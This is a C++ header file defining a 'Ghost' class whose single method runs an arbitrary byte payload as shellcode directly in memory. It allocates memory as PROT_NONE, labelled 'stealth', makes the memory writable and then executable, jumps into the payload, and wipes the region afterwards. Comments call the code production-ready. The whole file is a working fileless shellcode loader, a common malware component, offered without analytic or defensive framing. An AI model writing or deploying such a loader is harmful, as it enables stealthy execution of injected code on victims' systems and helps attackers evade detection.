#ifndef GHOST_H
#define GHOST_H

#include <vector>
#include <cstdint>
#include <sys/mman.h>
#include <unistd.h>
#include <cstring>

namespace ENI {
    class Ghost {
    public:
        // Production-ready memory execution with safety checks and clear transitions
        void execute_in_memory(const std::vector<uint8_t>& payload) {
            if (payload.empty()) return;

            size_t size = payload.size();
            // Align to page size for mprotect
            size_t page_size = sysconf(_SC_PAGESIZE);
            size_t aligned_size = (size + page_size - 1) & ~(page_size - 1);

            // 1. Initial Allocation (Stealth: PROT_NONE)
            void* mem = mmap(NULL, aligned_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (mem == MAP_FAILED) return;

            // 2. Load Payload (PROT_WRITE)
            if (mprotect(mem, aligned_size, PROT_READ | PROT_WRITE) == 0) {
                std::memcpy(mem, payload.data(), size);

                // 3. Execution (PROT_READ | PROT_EXEC)
                if (mprotect(mem, aligned_size, PROT_READ | PROT_EXEC) == 0) {
                    // Use a function pointer to jump to the code
                    // WARNING: This assumes the payload is position-independent code (PIC/shellcode)
                    typedef void (*shellcode_t)();
                    shellcode_t execute = (shellcode_t)mem;

                    // In a production environment, we'd wrap this in a fork or separate thread
                    // to prevent the main process from crashing if the payload faults.
                    execute();
                }
            }

            // 4. Secure Cleanup (Overwrite before unmapping)
            mprotect(mem, aligned_size, PROT_READ | PROT_WRITE);
            std::memset(mem, 0, aligned_size);
            munmap(mem, aligned_size);
        }
    };
}

#endif
